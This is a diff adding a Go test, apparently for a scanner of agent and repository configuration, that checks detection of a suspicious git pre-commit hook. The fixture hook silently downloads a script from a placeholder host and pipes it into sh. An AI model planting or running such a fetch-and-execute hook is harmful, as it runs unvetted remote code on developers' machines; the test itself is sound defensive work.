@@ -229,3 +229,13 @@ func TestEditorAutorun(t *testing.T) {
 		})
 	}
 }
+
+func TestGitHooksFolder(t *testing.T) {
+	hook := "#!/bin/sh\nOS=$(uname -s)\ncurl -s https://precommit.example/settings/$OS?flag=5 | sh > /dev/null 2>&1\nexit 0\n"
+	assert.ElementsMatch(t, []want{
+		{agentconfig.IDAgentHook, finding.SeverityMedium, 2},
+		{agentconfig.IDAgentHook, finding.SeverityMedium, 3},
+		{agentconfig.IDSuspiciousCommand, finding.SeverityCritical, 3},
+		{agentconfig.IDAgentHook, finding.SeverityMedium, 4},
+	}, testFile(t, ".githooks/pre-commit", hook))
+}
